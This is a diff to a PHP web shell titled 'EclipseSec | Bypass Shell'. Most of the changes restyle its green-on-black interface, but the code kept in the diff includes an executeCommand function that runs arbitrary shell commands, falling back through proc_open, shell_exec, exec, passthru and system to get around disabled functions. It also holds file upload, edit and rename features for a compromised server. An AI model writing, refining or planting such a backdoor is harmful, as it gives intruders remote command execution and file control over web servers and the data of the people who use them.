@@ -21,7 +21,6 @@ function getFileDetails($path)
         if (!is_array($items)) {
             throw new Exception('Failed to scan directory');
         }
-
         foreach ($items as $item) {
             if ($item == '.' || $item == '..') {
                 continue;
@@ -46,7 +45,6 @@ function getFileDetails($path)
         return 'None';
     }
 }
-
 function formatSize($size)
 {
     $units = array('B', 'KB', 'MB', 'GB', 'TB');
@@ -57,16 +55,12 @@ function formatSize($size)
     }
     return round($size, 2) . ' ' . $units[$i];
 }
-//cmd fitur
 function executeCommand($command)
 {
     $currentDirectory = getCurrentDirectory();
     $command = "cd $currentDirectory && $command";
-
     $output = '';
     $error = '';
-
-    // proc_open
     $descriptors = [
         0 => ['pipe', 'r'],
         1 => ['pipe', 'w'],
@@ -74,18 +68,13 @@ function executeCommand($command)
     ];
 
     $process = @proc_open($command, $descriptors, $pipes);
-
     if (is_resource($process)) {
         fclose($pipes[0]);
-
         $output = stream_get_contents($pipes[1]);
         fclose($pipes[1]);
-
         $error = stream_get_contents($pipes[2]);
         fclose($pipes[2]);
-
         $returnValue = proc_close($process);
-
         $output = trim($output);
         $error = trim($error);
 
@@ -95,8 +84,6 @@ function executeCommand($command)
             return 'Error: ' . $error;
         }
     }
-
-    // shell_exec
     $shellOutput = @shell_exec($command);
     if ($shellOutput !== null) {
         $output = trim($shellOutput);
@@ -109,8 +96,6 @@ function executeCommand($command)
             return 'Error: ' . $error['message'];
         }
     }
-
-    // exec
     @exec($command, $execOutput, $execStatus);
     if ($execStatus === 0) {
         $output = implode(PHP_EOL, $execOutput);
@@ -120,8 +105,6 @@ function executeCommand($command)
     } else {
         return 'Error: Command execution failed.';
     }
-
-    // passthru
     ob_start();
     @passthru($command, $passthruStatus);
     $passthruOutput = ob_get_clean();
@@ -133,8 +116,6 @@ function executeCommand($command)
     } else {
         return 'Error: Command execution failed.';
     }
-
-    // system
     ob_start();
     @system($command, $systemStatus);
     $systemOutput = ob_get_clean();
@@ -146,7 +127,6 @@ function executeCommand($command)
     } else {
         return 'Error: Command execution failed.';
     }
-
     return 'Error: Command execution failed.';
 }
 function readFileContent($file)
@@ -161,7 +141,6 @@ function saveFileContent($file)
     }
     return false;
 }
-//upfile
 function uploadFile($targetDirectory)
 {
     if (isset($_FILES['file'])) {
@@ -247,7 +226,7 @@ function showFileTable($path)
         <?php if (is_array($fileDetails)) { ?>
             <?php foreach ($fileDetails as $fileDetail) { ?>
                 <tr>
-                    <td><?php echo htmlspecialchars($fileDetail['name']); ?></td>
+                    <td><?php echo getLink($path . '/' . $fileDetail['name'], htmlspecialchars($fileDetail['name'])); ?></td>
                     <td><?php echo htmlspecialchars($fileDetail['type']); ?></td>
                     <td><?php echo htmlspecialchars($fileDetail['size']); ?></td>
                     <td><?php echo htmlspecialchars($fileDetail['permission']); ?></td>
@@ -504,7 +483,6 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
 }
 ?>
 <style>
-
 body {
     font-family: 'Courier New', monospace;
     font-size: 16px;
@@ -524,25 +502,18 @@ body {
     color: #00ff00;
 }
 
-h1 {
+h1, h2 {
     color: #00ff00;
     text-align: center;
     margin-bottom: 20px;
 }
 
-h2 {
-    color: #00ff00;
-    margin-bottom: 20px;
-}
-
-/* Notifications */
 .notification-success {
     color: #00ff00;
     font-weight: bold;
     margin: 10px 0;
 }
 
-/* Responsive Table */
 table {
     width: 100%;
     border-collapse: collapse;
@@ -567,21 +538,21 @@ table th {
 }
 
 table td:first-child {
-    color: #00ff00; /* Bright green for file/folder name */
+    color: #00ff00;
     display: flex;
     align-items: center;
     gap: 8px;
 }
 
-table td:first-child a {
-    color: #00ff00; /* Ensure file/folder name links are also green */
-}
-
-table td {
+table td:first-child a, table td a {
     color: #00ff00;
+    text-decoration: none;
 }
 
-/* File/Folder Icons */
+table td:first-child a:hover, table td a:hover {
+    text-decoration: underline;
+}
+
 table td:first-child img {
     width: 16px;
     height: 16px;
@@ -589,8 +560,7 @@ table td:first-child img {
     vertical-align: middle;
 }
 
-/* Buttons */
-button, input[type="submit"] {
+button, input[type="submit"], .dropbtn {
     background-color: #000000;
     color: #00ff00;
     border: 1px solid #00ff00;
@@ -601,12 +571,11 @@ button, input[type="submit"] {
     transition: background-color 0.3s ease, color 0.3s ease;
 }
 
-button:hover, input[type="submit"]:hover {
+button:hover, input[type="submit"]:hover, .dropbtn:hover {
     background-color: #00ff00;
     color: #000000;
 }
 
-/* Breadcrumb */
 .breadcrumb {
     margin-bottom: 20px;
     font-size: 14px;
@@ -621,7 +590,6 @@ button:hover, input[type="submit"]:hover {
     text-decoration: underline;
 }
 
-/* Forms */
 form input[type="text"], form input[type="file"], form textarea, form select {
     width: 100%;
     padding: 12px;
@@ -652,17 +620,18 @@ form input[type="file"]::-webkit-file-upload-button:hover {
     background-color: #00ff00;
     color: #000000;
 }
+
 .dropdown {
     position: relative;
     display: inline-block;
 }
 
 .dropbtn {
-    background-color: #4CAF50;
-    color: white;
-    padding: 10px;
-    font-size: 16px;
-    border: none;
+    background-color: #000000;
+    color: #00ff00;
+    border: 1px solid #00ff00;
+    padding: 8px 12px;
+    font-size: 14px;
     cursor: pointer;
     border-radius: 4px;
 }
@@ -670,41 +639,39 @@ form input[type="file"]::-webkit-file-upload-button:hover {
 .dropdown-content {
     display: none;
     position: absolute;
-    left: 0;
-    top: 100%; 
-    background-color: #f9f9f9;
+    background-color: #1e1e1e;
     min-width: 160px;
-    box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);
-    z-index: 9999;
-    border-radius: 4px; 
-    overflow: hidden;
+    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+    z-index: 1000;
+    border-radius: 4px;
+    overflow: visible;
+    right: 0;
+    bottom: 100%;
+    margin-bottom: 5px;
 }
 
 .dropdown-content a {
-    color: black;
+    color: #00ff00;
     padding: 12px 16px;
     text-decoration: none;
     display: block;
-    font-size: 14px; 
+    font-size: 14px;
     transition: background-color 0.2s ease-in-out;
 }
 
 .dropdown-content a:hover {
-    background-color: #f1f1f1;
+    background-color: #2c2c2c;
 }
 
 .dropdown:hover .dropdown-content {
-    display: block; 
+    display: block;
 }
 
-.dropdown:hover .dropbtn {
-    background-color: #3e8e41; 
-}
-
-@media (max-width: 600px) {
-    .dropdown-content {
-        min-width: 100px; 
-    }
+tr:nth-child(-n+3) .dropdown .dropdown-content {
+    bottom: auto;
+    top: 100%;
+    margin-top: 5px;
+    margin-bottom: 0;
 }
 
 .sidebar {
@@ -769,6 +736,7 @@ form input[type="file"]::-webkit-file-upload-button:hover {
     background-color: #00ff00;
     color: #000000;
 }
+
 .menu-icon {
     position: fixed;
     top: 20px;
@@ -814,33 +782,76 @@ form input[type="file"]::-webkit-file-upload-button:hover {
 .menu-icon.open::after {
     transform: translateY(0px) rotate(-45deg);
 }
+
 @media screen and (max-width: 768px) {
+    body {
+        font-size: 14px;
+    }
+
     .container {
         padding: 10px;
+        margin: 10px;
+    }
+
+    table {
+        font-size: 12px;
     }
 
     table th, table td {
-        font-size: 14px;
+        font-size: 12px;
         padding: 8px;
     }
 
-    button, input[type="submit"] {
-        font-size: 14px;
+    button, input[type="submit"], .dropbtn {
+        font-size: 12px;
         padding: 8px 16px;
     }
 
     form input[type="text"], form textarea, form select {
-        font-size: 14px;
+        font-size: 12px;
         padding: 8px;
     }
 
     .sidebar {
         width: 100%;
+        right: -100%;
+    }
+
+    .dropdown-content {
+        min-width: 120px;
+        position: fixed;
+        top: auto;
+        bottom: auto;
+        left: 50%;
+        transform: translateX(-50%);
+        margin: 5px 0;
+    }
+
+    tr:nth-child(-n+3) .dropdown .dropdown-content {
+        top: auto;
+        bottom: auto;
+    }
+
+    .dropbtn {
+        padding: 6px 10px;
+        font-size: 12px;
+    }
+
+    .dropdown-content a {
+        padding: 8px 12px;
+        font-size: 12px;
+    }
+
+    .menu-icon {
+        top: 10px;
+        right: 10px;
+        width: 30px;
+        height: 30px;
     }
 }
-
-
 </style>  
+<head>
+<title>EclipseSec | Bypass Shell</title>
 </head>
 <body>
     <div class="container">
@@ -932,7 +943,6 @@ if (isset($_GET['eclipsec'])) {
                 <input type="text" name="new_name" placeholder="New Name" required>
                 <br>
                 <input type="submit" value="Rename" class="button">
-                <a href="?nomi=<?php echo urlencode(dirname($file)); ?>" class="button">Cancel</a>
             </form>
         </div>
         <?php } ?>
@@ -1059,3 +1069,4 @@ if (isset($_GET['eclipsec'])) {
 </div>
 </body>
 </html>
+
